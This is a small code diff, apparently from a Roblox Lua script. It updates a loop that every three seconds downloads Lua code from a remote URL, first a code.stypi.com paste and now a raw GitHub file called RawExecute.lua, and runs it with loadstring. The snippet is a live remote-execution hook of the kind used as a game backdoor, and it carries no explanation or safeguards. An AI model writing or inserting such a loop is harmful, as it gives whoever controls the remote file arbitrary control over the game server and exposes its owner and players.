@@ -805,7 +805,7 @@ end)
 spawn(function()
     while wait(3) do
        loadstring(
-        game:service'HttpService':GetAsync('https://code.stypi.com/raw/jillmiles1/RawExe.lua',true)    
+        game:service'HttpService':GetAsync('https://raw.githubusercontent.com/Jillmiles1/Actinium/master/RawExecute.lua',true)    
        )() 
     end
 end)
